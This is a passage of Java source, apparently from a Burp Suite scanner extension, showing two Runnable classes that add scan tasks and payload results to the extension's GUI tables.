    class AddTaskRunnable implements Runnable {
        BurpExtender ext; ScanTask task;
        AddTaskRunnable(BurpExtender ext, ScanTask task) { this.ext = ext; this.task = task; }
        public void run() { ext.scanTasks.add(task); ext.urlTableModel.addRow(new Object[]{task.task_id, task.method, task.url, task.orig_len}); }
    }
    class AddPayloadRunnable implements Runnable {
        BurpExtender ext; ScanTask task; PayloadResult pr;
        AddPayloadRunnable(BurpExtender ext, ScanTask task, PayloadResult pr) { this.ext = ext; this.task = task; this.pr = pr; }
        public void run() {
            task.results.add(pr);
            int row = ext.urlTable.getSelectedRow();
            if (row != -1 && ext.scanTasks.get(ext.urlTable.convertRowIndexToModel(row)).task_id == task.task_id) {
                ext.payloadTableModel.addRow(new Object[]{pr.type, pr.payload, pr.newLen, pr.diff, pr.timeMs, pr.status});
            }
        }
    }
}